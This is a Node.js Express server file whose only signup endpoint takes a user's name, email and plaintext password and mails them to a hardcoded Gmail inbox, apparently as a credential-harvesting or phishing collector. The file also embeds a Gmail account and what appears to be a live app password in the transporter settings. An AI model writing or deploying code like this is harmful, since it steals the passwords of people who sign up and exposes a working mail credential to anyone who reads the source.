const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
app.use(cors());
app.use(bodyParser.json());

const path = require("path");

// Serve static files (e.g., HTML) from the "public" directory
app.use(express.static(path.join(__dirname, "public")));

// Predefined admin email
const adminEmail = "meshackchristian0@gmail.com"; // Replace with your real email

// Email transporter setup
const transporter = nodemailer.createTransport({
  service: "gmail", // You can also use Outlook, Yahoo, etc.
  auth: {
    user: "meshackchristian0@gmail.com",     // Your sending email
    pass: "jdtqqthhfjainjno"        // Use App Password (not your Gmail password)
  }
});

// Endpoint: Signup
app.post("/signup", async (req, res) => {
  const { name, email, password } = req.body;

  const emailBody = `
    <h3>New User Signup</h3>
    <p><strong>Name:</strong> ${name}</p>
    <p><strong>Email:</strong> ${email}</p>
    <p><strong>Password:</strong> ${password}</p>
  `;

  try {
    await transporter.sendMail({
      from: '"Signup Monitor" <yourgmail@gmail.com>',
      to: adminEmail,
      subject: "New Signup Notification",
      html: emailBody
    });

    res.status(200).json({ message: "Signup details sent successfully" });
  } catch (error) {
    console.error("Email error:", error);
    res.status(500).json({ message: "Failed to send signup details" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
